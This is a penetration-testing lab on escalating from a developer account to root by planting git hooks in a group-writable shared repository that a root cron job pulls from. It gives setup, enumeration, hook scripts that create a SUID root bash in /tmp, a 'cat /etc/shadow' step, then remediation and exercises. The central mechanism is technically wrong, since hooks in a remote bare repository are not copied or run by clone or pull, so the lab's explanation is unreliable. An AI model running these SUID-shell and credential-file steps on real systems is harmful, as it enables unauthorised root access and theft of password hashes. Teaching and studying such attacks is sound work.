# LAB: Git Hook Injection → Root

**Real-World Privilege Escalation**

---

## Scenario: Shared Development Repository

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The DevOps team has set up a shared git repository for deployments. An automated system runs as root to pull code changes and deploy them. The repository has group-writable permissions to allow developers to collaborate.

**Your access:**
- SSH access as `developer`
- Member of the `devteam` group
- Write access to the shared git repository
- No sudo privileges

**Your mission:**
Escalate from `developer` to `root` using only the access you have.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand git hooks and when they execute
2. Identify dangerous repository permissions
3. Exploit git operations via hook injection
4. Achieve root access from a developer account
5. Articulate the security boundaries that were violated

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the developer user and group

```bash
# Create development team group
groupadd devteam

# Create low-privilege developer user
useradd -m -s /bin/bash -G devteam developer
echo "developer:developer123" | chpasswd
```

### Create the shared git repository

```bash
# Create bare repository directory
mkdir -p /srv/git/webapp.git
cd /srv/git/webapp.git
git init --bare

# Set group-writable permissions (the vulnerability)
chown -R root:devteam /srv/git/webapp.git
chmod -R g+rwX /srv/git/webapp.git
find /srv/git/webapp.git -type d -exec chmod g+s {} \;
```

### Create the automated deployment script

```bash
cat > /usr/local/bin/deploy-webapp.sh << 'EOF'
#!/bin/bash
# Automated Deployment Script
# Deployed by DevOps - Do not modify
# Ticket: DEVOPS-1247
#
# This script pulls the latest code and deploys it

REPO="/srv/git/webapp.git"
DEPLOY_DIR="/var/www/webapp"
LOG="/var/log/deploy.log"

echo "[$(date)] Starting deployment" >> "$LOG"

# Create deployment directory if needed
mkdir -p "$DEPLOY_DIR"

# Clone/pull the repository
if [[ -d "$DEPLOY_DIR/.git" ]]; then
    cd "$DEPLOY_DIR"
    git pull origin main 2>> "$LOG"
else
    git clone "$REPO" "$DEPLOY_DIR" 2>> "$LOG"
    cd "$DEPLOY_DIR"
fi

echo "[$(date)] Deployment complete" >> "$LOG"
EOF

chmod 755 /usr/local/bin/deploy-webapp.sh
chown root:root /usr/local/bin/deploy-webapp.sh
```

### Schedule the deployment cron job

```bash
# Run deployment every 5 minutes
echo "*/5 * * * * root /usr/local/bin/deploy-webapp.sh" > /etc/cron.d/deploy-webapp
chmod 644 /etc/cron.d/deploy-webapp
```

### Initialize the repository with content

```bash
# Create a temp working directory
TEMP_DIR=$(mktemp -d)
cd "$TEMP_DIR"
git clone /srv/git/webapp.git .
git config user.email "admin@example.com"
git config user.name "Admin"

# Add some initial content
echo "<html><body>Hello World</body></html>" > index.html
git add index.html
git commit -m "Initial commit"
git push origin main 2>/dev/null || git push origin master

cd /
rm -rf "$TEMP_DIR"
```

### Create log file

```bash
touch /var/log/deploy.log
chmod 644 /var/log/deploy.log
```

**Setup complete.** The environment mimics a real deployment server.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker

```bash
su - developer
```

### Verify your (lack of) privileges

```bash
id
```

**Expected:**
```
uid=1001(developer) gid=1001(developer) groups=1001(developer),1002(devteam)
```

```bash
sudo -l
```

**Expected:**
```
Sorry, user developer may not run sudo on this host.
```

✅ You are a low-privilege user in the devteam group.

---

## PHASE 2 — Enumeration

### Look for git repositories

```bash
find /srv -name "*.git" -type d 2>/dev/null
```

**Found:**
```
/srv/git/webapp.git
```

### Examine repository permissions

```bash
ls -la /srv/git/webapp.git/
```

**Observations:**
```
drwxrwsr-x  7 root devteam 4096 ... .
drwxrwxr-x  3 root devteam 4096 ... hooks
```

- Directory is group-writable (`rwxrwsr-x`)
- `devteam` group has write access
- The `s` indicates setgid (new files inherit group)

### Check your group membership

```bash
groups
```

**Found:** `devteam` — You can write to this repository!

### Examine the hooks directory

```bash
ls -la /srv/git/webapp.git/hooks/
```

**Observations:**
- Contains sample hooks (`.sample` files)
- Directory is group-writable
- Hooks execute during git operations

### Look for automated processes

```bash
cat /etc/cron.d/*
```

**Found:**
```
*/5 * * * * root /usr/local/bin/deploy-webapp.sh
```

### Examine the deployment script

```bash
cat /usr/local/bin/deploy-webapp.sh
```

**Key observations:**
- Script runs as root
- Executes `git pull` or `git clone`
- Points to our writable repository

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Can I modify the deployment script? → No (owned by root)
2. Can I modify the git repository? → **Yes** (group-writable)
3. Can I create git hooks? → **Yes** (hooks directory is writable)
4. Do git hooks execute during pull/clone? → **Yes**

**This is a git hook injection vulnerability.**

---

## PHASE 3 — Understanding the Attack

### How git hooks work

Git hooks are scripts that run automatically at certain points:

| Hook | When it runs |
|------|--------------|
| `pre-commit` | Before a commit is created |
| `post-commit` | After a commit is created |
| `pre-receive` | Before refs are updated (server-side) |
| `post-receive` | After refs are updated (server-side) |
| `post-checkout` | After checkout/clone completes |
| `post-merge` | After a merge (including pull) |

### The attack vector

When root runs `git pull`:
1. Git fetches new commits
2. Git merges changes (triggers `post-merge`)
3. **`post-merge` hook executes as root**

When root runs `git clone`:
1. Git clones the repository
2. Git checks out files (triggers `post-checkout`)
3. **`post-checkout` hook executes as root**

### Why this works

The repository's hooks directory is group-writable. We can create a malicious hook that will execute when root performs git operations.

---

## PHASE 4 — Exploitation

### Create a malicious post-merge hook

This hook executes after `git pull` merges changes:

```bash
cat > /srv/git/webapp.git/hooks/post-merge << 'EOF'
#!/bin/bash
# Create SUID root shell
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
# Evidence
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF

chmod +x /srv/git/webapp.git/hooks/post-merge
```

### Also create post-checkout hook (for clone operations)

```bash
cat > /srv/git/webapp.git/hooks/post-checkout << 'EOF'
#!/bin/bash
# Create SUID root shell
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
# Evidence
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF

chmod +x /srv/git/webapp.git/hooks/post-checkout
```

### Trigger the deployment (requires a new commit)

For `post-merge` to trigger, there must be changes to merge. Create a commit:

```bash
# Clone the repo to make changes
cd /tmp
git clone /srv/git/webapp.git work
cd work
git config user.email "developer@example.com"
git config user.name "Developer"

# Make a change
echo "<!-- Update $(date) -->" >> index.html
git add index.html
git commit -m "Minor update"
git push origin main 2>/dev/null || git push origin master

# Cleanup
cd /
rm -rf /tmp/work
```

### Verify hooks are in place

```bash
ls -la /srv/git/webapp.git/hooks/post-*
```

**Expected:**
```
-rwxrwxr-x 1 developer devteam ... post-checkout
-rwxrwxr-x 1 developer devteam ... post-merge
```

---

## PHASE 5 — Wait for Execution

### Option A: Wait for cron

The deployment runs every 5 minutes:

```bash
watch -n 10 'ls -la /tmp/rootbash /tmp/pwned.txt 2>/dev/null'
```

### Option B: Instructor triggers manually

```bash
# Run as root to simulate cron
sudo /usr/local/bin/deploy-webapp.sh
```

### Verify the payload executed

```bash
ls -la /tmp/rootbash
```

**Expected:**
```
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

---

## PHASE 6 — Privilege Escalation Complete

### Execute the SUID shell

```bash
/tmp/rootbash -p
```

### Verify root access

```bash
id
```

**Expected:**
```
uid=1001(developer) gid=1001(developer) euid=0(root) groups=1001(developer),1002(devteam)
```

### Demonstrate root capabilities

```bash
whoami
cat /etc/shadow | head -3
touch /root/pwned_by_developer
```

### Exit

```bash
exit
```

---

## PHASE 7 — Post-Exploitation Analysis

### The attack chain

```
developer (uid=1001, group=devteam)
    │
    ├── Enumerated git repositories
    ├── Found /srv/git/webapp.git (group-writable)
    ├── Discovered root cron job running git pull
    │
    ▼
Created malicious git hooks
    │
    ├── post-merge (triggers on pull)
    ├── post-checkout (triggers on clone)
    │
    ▼
Pushed commit to trigger merge
    │
    ▼
Root cron executed git pull
    │
    ├── Git merged changes
    ├── post-merge hook executed as root
    ├── SUID bash created
    │
    ▼
root (euid=0)
```

### What failed

| Layer | Failure |
|-------|---------|
| **Permissions** | Hooks directory writable by developers |
| **Design** | Root executes git on repository controlled by developers |
| **Least Privilege** | Deployment runs as root instead of deploy user |

### The one-sentence summary

> **Root executed git operations on a repository where developers could write hooks.**

---

## REMEDIATION

### Fix 1: Protect the hooks directory

```bash
# Make hooks owned by root only
chown -R root:root /srv/git/webapp.git/hooks
chmod 755 /srv/git/webapp.git/hooks
chmod 644 /srv/git/webapp.git/hooks/*
```

### Fix 2: Run deployment as non-root user

```bash
# Create dedicated deploy user
useradd -r -s /usr/sbin/nologin deploy

# Change cron to run as deploy user
*/5 * * * * deploy /usr/local/bin/deploy-webapp.sh
```

### Fix 3: Use --config to disable hooks

```bash
# In deploy script, disable hooks
git -c core.hooksPath=/dev/null pull
```

### Fix 4: Verify repository integrity before operations

```bash
# Check for unauthorized hooks before pulling
if [[ -n "$(find /srv/git/webapp.git/hooks -type f ! -name '*.sample' 2>/dev/null)" ]]; then
    echo "WARNING: Unauthorized hooks detected!"
    exit 1
fi
```

### Fix 5: Use CI/CD pipeline instead

Instead of direct git operations by root, use a proper CI/CD system:
- Jenkins, GitLab CI, GitHub Actions
- Build/deploy in isolated containers
- No root access required on production server

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-78: OS Command Injection |
| **CWE** | CWE-732: Incorrect Permission Assignment |
| **MITRE ATT&CK** | T1053.003: Scheduled Task/Job: Cron |
| **MITRE ATT&CK** | T1059.004: Command and Scripting Interpreter: Unix Shell |

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **Shared development servers** — Team repositories with loose permissions
2. **Git-based deployment** — Automated pulls without security controls
3. **GitOps workflows** — Configuration repos with excessive permissions
4. **Build servers** — CI systems that clone untrusted repositories

---

## CLEANUP (Instructor)

```bash
# Remove user
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true
groupdel devteam 2>/dev/null || true

# Remove deployment infrastructure
rm -f /etc/cron.d/deploy-webapp
rm -f /usr/local/bin/deploy-webapp.sh
rm -rf /srv/git
rm -rf /var/www/webapp
rm -f /var/log/deploy.log

# Remove exploitation artifacts
rm -f /tmp/rootbash
rm -f /tmp/pwned.txt
rm -f /root/pwned_by_developer
```

---

## STUDENT EXERCISES

### Exercise 1: Alternative Hooks

Research and test other git hooks that could be exploited:
- `pre-receive`
- `update`
- `pre-push`

### Exercise 2: Server-Side vs Client-Side Hooks

Explain the difference between server-side and client-side hooks. Which are more dangerous in this scenario?

### Exercise 3: Detection

Write a script that detects:
- Executable hooks in git repositories
- Hooks not owned by root
- Recently modified hooks

### Exercise 4: Git Configuration Attacks

Research `core.hooksPath` and how it could be abused.
